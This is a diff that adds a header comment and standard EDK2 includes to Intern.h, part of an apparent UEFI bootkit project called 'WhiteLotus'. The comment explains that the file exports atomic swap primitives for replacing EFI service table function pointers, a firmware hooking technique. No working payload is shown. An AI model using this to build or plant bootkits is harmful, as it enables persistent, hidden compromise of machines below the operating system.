@@ -1,3 +1,25 @@
+/*
+ * ============================================================
+ *  Project  : WhiteLotus — UEFI Bootkit DXE Driver
+ *  File     : Intern.h
+ * ============================================================
+ *
+ *  Description:
+ *    Declares prototypes for the interlocked compare-exchange
+ *    functions (32-bit, 64-bit, and pointer-sized variants)
+ *    implemented in Intern.c.
+ *
+ *  Purpose:
+ *    - Export atomic swap primitives to WhiteLotus.c for safe
+ *      EFI service table function pointer replacement.
+ *
+ *  Author   : 0xbekoo
+ *  Blog     : https://0xbekoo.github.io
+ *  Updated  : 2026-05-21
+ *
+ * ============================================================
+ */
+
 #include <Uefi.h>
 #include <Library/UefiLib.h>
 #include <Library/UefiDriverEntryPoint.h>
